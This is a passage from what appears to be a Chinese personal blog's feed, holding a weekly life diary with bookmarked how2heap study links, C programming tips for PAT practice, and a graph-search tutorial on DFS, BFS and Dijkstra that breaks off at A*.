    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>祝融号发回遥测图像，很棒，中国航天 NB！</li><li>华强北的赛格大厦发生摇晃，事故原因正在调查中。</li><li>新垣结衣结婚啦，虽然我没有看过她的作品，但的确是一位看起来非常舒服的女星呢！《逃避虽可耻但有用》是她和他老公主演的电视剧，感觉会很有意思呢，以后有空了一定要看一看！</li><li>比特币开启熊市，距离 6W 美元的高点，目前已经跌破 3W 美元。伴随其的，是整个加密货币市场的全线崩盘，国家机器开始干预这个疯狂的市场。</li><li>南极洲最大冰山脱落，相当于 60%的上海。</li><li>云南大理 6.4 级地震。</li><li>青海 7.4 级地震。</li><li>5 月 22 日，袁隆平院士去世，享年 91 岁。</li><li>吴孟超院士去世，享年 99 岁。</li><li>甘肃白银景泰超级山地马拉松发生突发性局部恶劣天气，导致 21 名马拉松选手遇难。</li><li>大连宝马撞死 5 人，时速达 195km/h，现场视频非常可怕，系投资失败报复社会。</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>去和导师面基了，表现的不是很好，有不少问题问题回答都有点问题，提升自己的能力 up,up!还有一个半月，来得及！</li><li>西交好和谐，在里面走有种在青岛的感觉！起伏的道路，到处合抱粗的梧桐，简直无比舒服！虽然楼很旧，但是老师很 nice，真的真的希望可以保研成功到西交呀！</li><li>无线安全实验把我搞迷了，实验成功率不高，特别容易收到干扰，比如我们一直没有收到自己的基站信号，别的人也收不到他们自己的基站信号。</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li>fuzzingbook2</li><li><a href="https://xz.aliyun.com/t/2582">通过 how2heap 复习堆利用 (一）</a></li><li><a href="https://www.anquanke.com/post/id/192823">How2Heap 堆利用学习笔记（一）</a></li><li><a href="https://bbs.pediy.com/thread-259269.htm">堆入门攻略-how2heap 学习总结</a></li><li>patchelf</li><li><a href="https://www.anquanke.com/post/id/86808">how2heap 总结-上</a></li><li><a href="https://www.anquanke.com/post/id/86809">how2heap 总结-下</a></li><li><a href="https://juejin.cn/post/6844903829952004104">how2heap 之 glibc——2.26 版本</a></li><li><a href="https://a1ex.online/2020/08/30/PWN-%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84glibc/">PWN_使用不同版本的 glibc</a></li><li><a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>无</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>深度思考</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>冒泡排序及优化、快排、希尔排序、堆排序、归并排序</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>我逐渐理解了为什么现在的大部分女生都不再社交平台秀恩爱，或者是简单的展示自己的恋爱状态。</li><li>这周世界非常混乱，周末短短几天，大地震、袁老千古，真的让人心乱，就和做梦似的。记得那天，上午还晴空，过了中午就开始阴云密布，狂风卷集着乌云，冷雨一直下，后到中雨，直至午夜。</li><li>长亭外，古道边，芳草碧连天。我参与了袁老的网上吊唁活动，寄念哀思，希望袁老能在天上继续保佑着华夏大地。</li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-17-to-23-1.jpeg#clientId=u737e3495-1e5b-4&from=drop&height=373&id=u7705954a&margin=%5Bobject%20Object%5D&name=mmexport1621741590095.jpg&originHeight=1920&originWidth=1080&originalType=binary&size=1086399&status=done&style=none&taskId=u80329fcb-efdd-4906-9ef7-3f52be9694e&width=210" alt="mmexport1621741590095.jpg"></p><ol start="4"><li>一定要眼观六路，耳听八方。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;祝融号发回遥测图像，很棒，中国航天 NB！&lt;/li&gt;
&lt;li&gt;华强北的赛格大厦发生摇晃，事故原因正在调查中。&lt;/li&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>PAT算法刷题（1）</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/15/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%EF%BC%881%EF%BC%89_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/15/PAT%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%EF%BC%881%EF%BC%89_new/</id>
    <published>2021-05-15T15:56:55.000Z</published>
    <updated>2021-06-21T06:38:12.030Z</updated>
    
    <content type="html"><![CDATA[<p>tags: []<br>categories: []<br>cover: “”<br>​</p><hr><p>开始</p><a id="more"></a><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><ol><li>浮点型不要用 float 定义，而要用 double 定义，因为精度问题，float 只能有效精度为 6 位左右。</li><li>ASCII 码中，小写字母比大写字母的 ASCII 码大 32，具体是 A<del>Z：65</del>90，a<del>z：97</del>122</li><li>位运算符：<ol><li>A&lt;&lt;x 左移，整数 A 按照二进制左移 x 位</li><li>a &amp; b 位与，整数 a 和 b 按二进制对齐，按照位进行<strong>与运算</strong></li><li>a | b 位或，整数 a 和 b 按二进制对齐，按照位进行<strong>或运算</strong></li><li>a ^ b 位异或，按位进行异或运算</li><li>~a，取反，整数 a 的二进制每一位取反</li></ol></li><li>scanf 的格式化输入–只记录几种不常用的<ol><li>long long 的输入 ：%lld</li><li>double 的输入： %lf</li><li>字符串（char 数组）: %s，注意，字符串输入不需要加&amp;进行取址，即 scanf(“%s”,str)是正确的。（因为数组名称本身就代表这个数组第一个元素的地址，所以不需要加取地址）</li></ol></li><li>typedef 是给复杂的数据结构起别名的<ol><li>例 1： typedef long long LL;//给 long long 起别名 LL</li></ol></li><li>一些常用的 math 函数<ol><li>floor(double x)–向下取整</li><li>ceil(double x)–向上取整</li><li>log()–用于返回以自然对数为底的对数<ol><li>注意，c 里面没有对任意底数求对数的函数，必须用换底公式 log_a{b}=log_e{b}/log_e{a}</li></ol></li><li>sin,cos,tan–三角函数，必须是弧度制，即 pi/2 一类的</li><li>asin,acos–返回 double 的三角函数值</li></ol></li><li>switch</li></ol><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line">    <span class="keyword">case</span> 常量结果<span class="number">1</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> 结果<span class="number">2</span>:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="8"><li>数组初始化<ol><li>比如 <code>int a[10] = &#123;0&#125;;</code>就可以把整个数组都赋值 0，或者<code>int a[10] = &#123;&#125;;</code>也可以做到</li><li>如果数组大小在 10 的 6 次方以上，需要将其定义在主函数之外，即静态存储区申请空间，如<code>int a[1000000];</code></li><li>memset-对数组中每个元素赋值相同值<ol><li>memset(数组名，值，sizeof(数组名))</li><li>建议只使用 memset 赋值 0 和-1，因为它是按字节赋值，比如 int 是 4 个字节</li><li>对于数组赋予其他值（比如 1），请使用 fill 函数</li></ol></li></ol></li><li>gets 识别\n 作为输入结束，因此使用 scanf 接收完之后，如果要使用 gets，需要先用 getchar()接收整数后的换行符</li><li>strlen()–字符串长度</li><li>strcmp(char a[].char b[])–字符串比较</li><li>strcpy(char a[].char b[])–把 b 字符串数组赋给 a 数组</li><li>字符串处理利器<ol><li>sscanf(char str[],”%d”,&amp; int n)–把字符串数组的内容以%d 的格式写到变量 n 中–从左到右</li><li>sprintf(char str[],”%d”,int n)–把整型变量 n 以%d 的格式写到 str 数组中，从右到左</li></ol></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;tags: []&lt;br&gt;categories: []&lt;br&gt;cover: “”&lt;br&gt;​&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;开始&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>生活周报-May-10-to-16</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/15/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-10-to-16_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/15/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-10-to-16_new/</id>
    <published>2021-05-15T15:44:27.000Z</published>
    <updated>2021-06-21T06:38:22.518Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>成都 49 中跳楼案水落石出</li><li>比特币暴跌，20 万用户爆仓</li><li>盖茨被爆性丑闻</li><li>祝融火星探测器成功登录火星乌托邦平原</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>又是暴雨，下的及时，下的巧妙，恰似那未曾萌芽的爱情。始于暴雨，终于暴雨。</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>看到了哪些好文？</p><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>追了哪些剧？</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>深度思考</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>又学了哪些新知识?</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>关于人生，关于体验</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;成都 49 中跳楼案水落石出&lt;/li&gt;
&lt;li&gt;比特币暴跌，20 万用户爆仓&lt;/li&gt;
&lt;li&gt;盖茨被爆性丑闻&lt;/li&gt;
&lt;li</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>图搜索算法学习</title>
    <link href="https://www.blog.hackerjerry.top/2021/05/11/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0_new/"/>
    <id>https://www.blog.hackerjerry.top/2021/05/11/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0_new/</id>
    <published>2021-05-11T07:53:33.000Z</published>
    <updated>2021-06-21T06:38:37.543Z</updated>
    
    <content type="html"><![CDATA[<p>本文将从图搜索算法的基本流程入手，层层递进地介绍几种图搜索算法。首先是两种针对无权图的基本图搜索算法：<strong>深度优先搜索(Depth First Search, DFS)**、</strong>广度优先搜索(Breadth First Search, BFS)<strong>。它们的区别在于 openlist(后面介绍)所选用的数据结构类型不同，前者使用栈，后者使用队列；之后引入一种启发式搜索算法：</strong>贪婪最佳优先算法*<em>(<strong>Greedy Best First Search, GBFS</strong>)，用来提高搜索效率，但是不能确保找到最优路径；最后介绍两种在路径规划中非常经典的算法：<strong>Dijkstra 算法</strong>、**A\</em>算法**，前者是广度优先算法(BFS)在带权图中的扩展，后者则是在前者中加入启发函数得到的算法，兼顾效率和完备性。</p><a id="more"></a><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>下面切入正题，图搜索算法的基本流程如下：</p><ul><li>创建一个容器，一般称为<strong>openlist</strong>，用来存储将要访问的节点</li><li>将起点加入容器</li><li>开始循环：</li><li>—- 弹出：从容器中取出一个节点</li><li>—- 扩展：获取该节点周围的节点，将这些节点放入容器</li></ul><p>作者：鬼木士链接：<a href="https://zhuanlan.zhihu.com/p/346666812%E6%9D%A5%E6%BA%90%EF%BC%9A%E7%9F%A5%E4%B9%8E%E8%91%97%E4%BD%9C%E6%9D%83%E5%BD%92%E4%BD%9C%E8%80%85%E6%89%80%E6%9C%89%E3%80%82%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E8%81%94%E7%B3%BB%E4%BD%9C%E8%80%85%E8%8E%B7%E5%BE%97%E6%8E%88%E6%9D%83%EF%BC%8C%E9%9D%9E%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E6%B3%A8%E6%98%8E%E5%87%BA%E5%A4%84%E3%80%82">https://zhuanlan.zhihu.com/p/346666812来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</a></p><h3 id="图结构的邻接矩阵表示法"><a href="#图结构的邻接矩阵表示法" class="headerlink" title="图结构的邻接矩阵表示法"></a>图结构的邻接矩阵表示法</h3><p><strong>邻接矩阵</strong>用来表示图的边集，即节点间的相邻关系集合。设 <img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276356-ada93f8f-d8ba-4f17-98ec-9af058cd477f.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u4bc6664d&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=102&originalType=url&status=done&style=none&taskId=u8e0433de-cbce-4ed5-b260-4e2f71ad8c0&width=51"> 是一个具有 n 个节点的图，它的邻接矩阵是一个 n 阶矩阵，则其中的元素 <img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276341-89563210-0b27-48f5-992c-5bc26999cdaa.svg#clientId=u4512e8b3-315c-4&from=paste&height=11&id=udc2dd334&margin=%5Bobject%20Object%5D&originHeight=21&originWidth=24&originalType=url&status=done&style=none&taskId=u2df13e1a-f9b8-4281-823a-168ccdf6e50&width=12"> 满足：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-1.svg#clientId=u4512e8b3-315c-4&from=paste&height=34&id=ubaaea0f0&margin=%5Bobject%20Object%5D&originHeight=68&originWidth=432&originalType=url&status=done&style=none&taskId=ud90780c7-8c45-4351-afd3-b4a40e55462&width=216"><br>对于无向图，其邻接矩阵是对称矩阵，即 <img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276360-06638203-15d1-4db8-9832-91cda47c94af.svg#clientId=u4512e8b3-315c-4&from=paste&height=11&id=u782dacff&margin=%5Bobject%20Object%5D&originHeight=21&originWidth=77&originalType=url&status=done&style=none&taskId=u190fa9eb-a53b-4d83-b57a-bcaa10caa34&width=38.5"> ，而有向图的邻接矩阵不一定对称，其空间复杂度均为 <img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276368-54baba56-84e8-456e-9a3a-2228ee191d73.svg#clientId=u4512e8b3-315c-4&from=paste&height=15&id=u082a2bca&margin=%5Bobject%20Object%5D&originHeight=29&originWidth=54&originalType=url&status=done&style=none&taskId=u3f3f3403-8b0c-41d0-9d2a-a53d9cf6fb2&width=27"> 。以下为两个不带权图的邻接矩阵示例：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-2.jpg#clientId=u4512e8b3-315c-4&from=paste&height=146&id=u6d0c1531&margin=%5Bobject%20Object%5D&originHeight=291&originWidth=300&originalType=url&status=done&style=none&taskId=ua9947cb2-a6f0-4a06-b876-917c53e91ed&width=150"><br>对于<strong>带权图</strong>，设 <img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276919-e8f40e24-f907-48d0-9439-9c210e6637b7.svg#clientId=u4512e8b3-315c-4&from=paste&height=14&id=ucc327eee&margin=%5Bobject%20Object%5D&originHeight=27&originWidth=71&originalType=url&status=done&style=none&taskId=udc0d541f-3cdf-48fb-bd16-1da62d51156&width=35.5"> 或者 <img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725276928-11917431-d782-4dbc-afcd-7d8bfe260858.svg#clientId=u4512e8b3-315c-4&from=paste&height=8&id=u386178d2&margin=%5Bobject%20Object%5D&originHeight=15&originWidth=10&originalType=url&status=done&style=none&taskId=uf489f51a-13af-43ec-ba53-deea1911e98&width=5"> 上的权值为 <img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620725277029-5536e091-2e54-43da-acfc-3aee813c2193.svg#clientId=u4512e8b3-315c-4&from=paste&height=11&id=uaf1ce0d4&margin=%5Bobject%20Object%5D&originHeight=21&originWidth=28&originalType=url&status=done&style=none&taskId=u0cdccce9-6f0a-43c0-87fe-f34571b4c94&width=14"> ，则带权图的邻接矩阵定义为：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-3.svg#clientId=u4512e8b3-315c-4&from=paste&height=48&id=u5b09c490&margin=%5Bobject%20Object%5D&originHeight=95&originWidth=452&originalType=url&status=done&style=none&taskId=u09279262-4765-43c1-8607-7946ed5add6&width=226"><br>以下为两个带权图的邻接矩阵示例：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-4.jpg#clientId=u4512e8b3-315c-4&from=paste&height=156&id=ue0476deb&margin=%5Bobject%20Object%5D&originHeight=312&originWidth=300&originalType=url&status=done&style=none&taskId=ub5290b0d-99b5-4ace-9bc6-458f46faf37&width=150"></p><h2 id="深度优先搜索-DFS"><a href="#深度优先搜索-DFS" class="headerlink" title="深度优先搜索(DFS)"></a>深度优先搜索(DFS)</h2><p>深度优先，顾名思义即深度越大的节点会被优先扩展。在 DFS 中，使用<strong>栈(Stack)**数据结构来实现上述特性。<br>栈是一种</strong>后进先出(LIFO)<strong>的容器，如下图<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-5.jpg#clientId=u4512e8b3-315c-4&from=paste&height=187&id=ub038a80c&margin=%5Bobject%20Object%5D&originHeight=229&originWidth=252&originalType=url&status=done&style=none&taskId=u32928bb0-c0d9-4527-918f-e65db8c6619&width=206"><br>以在下面的</strong>无权图**中找到从节点 a 到节点 i 的路径为例，说明一下 DFS 算法的工作流程<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-6.jpg#clientId=u4512e8b3-315c-4&from=paste&height=137&id=u70b5387b&margin=%5Bobject%20Object%5D&originHeight=274&originWidth=368&originalType=url&status=done&style=none&taskId=u2ec2716b-c4cd-49e2-8c58-e23e99018da&width=184"><br>按照上节的图搜索算法的基本流程进行搜索，过程如下：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-7.jpg#clientId=u4512e8b3-315c-4&from=paste&height=118&id=ue3f3c139&margin=%5Bobject%20Object%5D&originHeight=236&originWidth=1277&originalType=url&status=done&style=none&taskId=u0dcdaa19-58a5-4b08-b306-9e472773c16&width=638.5"><br>从 i 回溯得到路径：a-&gt;b-&gt;c-&gt;g-&gt;i，如下：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-8.jpg#clientId=u4512e8b3-315c-4&from=paste&height=137&id=u449947f3&margin=%5Bobject%20Object%5D&originHeight=273&originWidth=367&originalType=url&status=done&style=none&taskId=u2b885412-dc7b-4b20-ac5a-b819ab82efd&width=183.5"></p><h2 id="广度优先搜索-BFS"><a href="#广度优先搜索-BFS" class="headerlink" title="广度优先搜索(BFS)"></a>广度优先搜索(BFS)</h2><p>与 DFS 的“不撞南墙不回头”的个性不同，BFS 在搜索时呈<strong>波状推进</strong>形式，一路稳扎稳打，它是一种<strong>以时间换空间</strong>的方法，能够保证搜索到的路径是最优的。<br>为了实现波状推进搜索特性，BFS 采用<strong>队列(Queue)**作为 openlist 的数据结构。队列是一种</strong>先进先出(FIFO)**的容器，如下图<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-9.jpg#clientId=u4512e8b3-315c-4&from=paste&height=88&id=ud12a1bda&margin=%5Bobject%20Object%5D&originHeight=175&originWidth=643&originalType=url&status=done&style=none&taskId=u3a1b1346-f237-46b8-9d09-a3b4054e02d&width=321.5"><br>其流程与上节中 DFS 类似，继续以上节的图举例，过程如下，首先创建一个队列作为容器，将节点 a 加入队列</p><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-10.jpg#clientId=u4512e8b3-315c-4&from=paste&height=54&id=uac838178&margin=%5Bobject%20Object%5D&originHeight=108&originWidth=744&originalType=url&status=done&style=none&taskId=ufb837890-53a7-4c8a-b201-4f00e37582e&width=372"><br>接着将节点 a 弹出队列，将节点 a 周围没有访问过的节点加入队列<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-11.jpg#clientId=u4512e8b3-315c-4&from=paste&height=84&id=u1a3884c7&margin=%5Bobject%20Object%5D&originHeight=168&originWidth=752&originalType=url&status=done&style=none&taskId=u06bcf717-b733-4fe0-a0e8-e47485993d0&width=376"><br>按照上面的流程不断地<strong>弹出、扩展</strong>节点，直到找到节点 i 为止，完整流程如下图：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-12.jpg#clientId=u4512e8b3-315c-4&from=paste&height=384&id=u4b228bb6&margin=%5Bobject%20Object%5D&originHeight=768&originWidth=752&originalType=url&status=done&style=none&taskId=uf69ba2e0-88b1-4285-8540-21d9787fb80&width=376"><br>从终点回溯，i 的父节点为 f，f 的父节点为 e，e 的父节点为 a，这样就可以得到 a 到 i 的最短路径为：a-&gt;e-&gt;f-&gt;i，如下<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-13.jpeg#clientId=u4512e8b3-315c-4&from=paste&height=200&id=u9d7c5033&margin=%5Bobject%20Object%5D&originHeight=399&originWidth=720&originalType=url&status=done&style=none&taskId=ube00c3d7-c002-4c0a-9de2-74816c1441b&width=360"><br>显而易见，相较于 DFS，BFS 中使用了大量的入队、出队操作，耗时增加，但是能保证找到最优路径。</p><h2 id="Dijkstra-算法"><a href="#Dijkstra-算法" class="headerlink" title="Dijkstra 算法"></a>Dijkstra 算法</h2><p>上面的算法中，只有广度优先搜索(BFS)具有完备性，能够保证搜索到最优路径。但是可以看到 BFS 算法搜索到的路径只有向上/下/左/右移动这四个动作，它们是没有权值或者说权值都相同的，只能用于无权图的路径规划，无法实现能够对角移动的路径规划。因此下面介绍一种能用于带权图的图搜索算法——Dijkstra 算法(狄克斯特拉算法)。<br>Dijkstra 算法是从一个顶点到其余各顶点的最短路径算法，其流程仍然与上述算法基本一致，它也是用优先队列作为 openlist 的数据结构，它和 GBFS 的区别在于代价函数<img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620723691035-98fc7aa9-f863-4712-bac3-8f57411585e6.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u28f910d0&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=40&originalType=url&status=done&style=none&taskId=uabd98f3e-5132-480c-8650-2d94afd29b4&width=20">的定义，Dijkstra 算的<img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620723691113-2bf1da8e-b611-4885-a7f1-04164c40d237.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=ubf3cbf54&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=40&originalType=url&status=done&style=none&taskId=ufbbe61e2-28bc-45d0-b633-061774a7863&width=20">定义为：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-14.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=uc782ed82&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=107&originalType=url&status=done&style=none&taskId=u79b0ef1e-5762-4b77-8b5b-162e6ba7aa0&width=53.5"><br>其中<img src= "/img/loading.gif" data-lazy-src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1620723690991-a4dc7fa7-b40f-4515-b86e-7febdfd73f37.svg#clientId=u4512e8b3-315c-4&from=paste&height=13&id=u4bc7f663&margin=%5Bobject%20Object%5D&originHeight=26&originWidth=39&originalType=url&status=done&style=none&taskId=u82673318-68cb-422c-b8b2-88439071c0e&width=19.5">表示<strong>从起点到当前点的移动代价</strong>。<br>作者：鬼木士链接：<a href="https://zhuanlan.zhihu.com/p/346666812%E6%9D%A5%E6%BA%90%EF%BC%9A%E7%9F%A5%E4%B9%8E%E8%91%97%E4%BD%9C%E6%9D%83%E5%BD%92%E4%BD%9C%E8%80%85%E6%89%80%E6%9C%89%E3%80%82%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E8%81%94%E7%B3%BB%E4%BD%9C%E8%80%85%E8%8E%B7%E5%BE%97%E6%8E%88%E6%9D%83%EF%BC%8C%E9%9D%9E%E5%95%86%E4%B8%9A%E8%BD%AC%E8%BD%BD%E8%AF%B7%E6%B3%A8%E6%98%8E%E5%87%BA%E5%A4%84%E3%80%82">https://zhuanlan.zhihu.com/p/346666812来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</a><br>以下图为例，计算起点 a 到终点 i 的最短路径，箭头上的数值表示<strong>两个节点间的距离</strong><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-15.jpg#clientId=u4512e8b3-315c-4&from=paste&height=138&id=uce92bbd0&margin=%5Bobject%20Object%5D&originHeight=275&originWidth=369&originalType=url&status=done&style=none&taskId=u1b2110ca-eadb-4f25-8e5d-d5865274f54&width=184.5"><br>首先扩展第一个节点，计算其余节点与第一个节点的距离，用橙色标出已经扩展的节点，未扩展的节点仍用绿色标出，其中圆中的数值表示<strong>该节点的代价函数</strong>，字母则表示该节点没有直接到达此时已扩展节点的路径。从未扩展的节点(绿色节点)中选择代价函数最小的节点进行拓展，并更新其余节点的代价函数，如下图<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-16.jpg#clientId=u4512e8b3-315c-4&from=paste&height=137&id=uc0f1683a&margin=%5Bobject%20Object%5D&originHeight=274&originWidth=1124&originalType=url&status=done&style=none&taskId=u8a1450f1-79f9-4399-8f8d-e169c2c3ede&width=562"><br>重复进行上面的步骤，直到所有节点都已扩展。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-17.jpeg#clientId=u4512e8b3-315c-4&from=paste&height=270&id=u45e4071d&margin=%5Bobject%20Object%5D&originHeight=539&originWidth=720&originalType=url&status=done&style=none&taskId=ud51a5969-c955-4e39-8e84-4a846498db9&width=360"><br>最后标出起点到终点的最短路径<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/%E5%9B%BE%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-18.png#clientId=u4512e8b3-315c-4&from=paste&height=137&id=u56f0c87f&margin=%5Bobject%20Object%5D&originHeight=274&originWidth=369&originalType=url&status=done&style=none&taskId=ua013e2b8-7911-432c-a37e-57920b0aa19&width=184.5"></p><h2 id="A-算法"><a href="#A-算法" class="headerlink" title="A*算法"></a>A*算法</h2><p>对比 GBFS 和 Dijkstra 